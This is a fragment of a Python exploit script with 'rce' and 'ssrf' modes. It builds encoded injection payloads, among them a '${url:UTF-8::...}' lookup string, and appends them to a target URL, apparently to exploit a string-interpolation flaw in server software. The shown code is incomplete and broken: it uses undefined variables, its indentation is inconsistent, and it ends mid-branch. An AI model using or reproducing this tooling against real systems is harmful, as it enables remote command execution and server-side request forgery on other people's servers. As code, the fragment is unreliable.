 
 parser.add_argument('-c', '--command', type=str, required=False, help='Command to be executed')
 parser.add_argument('-u', '--url', type=str, required=True, help='Base URL (if RCE mode selected, include ?variable=)')
 parser.add_argument('-m', '--mode', type=str, required=True, choices=['ssrf', 'rce'], help='Mode to be used')
 
 
 #Check Mode
 if args.mode == 'rce':
     if not args.command:
        print("Error: command must be provided for rce feature")
         exit(1)
 
     # Payload creation & encoding
     full_url = f"{args.url}{js_command_encoded}"
 
 elif args.mode == 'ssrf':
 
     # Payload creation & encoding
    ssrf = f"${{url:UTF-8::{args.url}}}"
     ssrf_encoded = urllib.parse.quote(ssrf)
 
     # Combine command and URL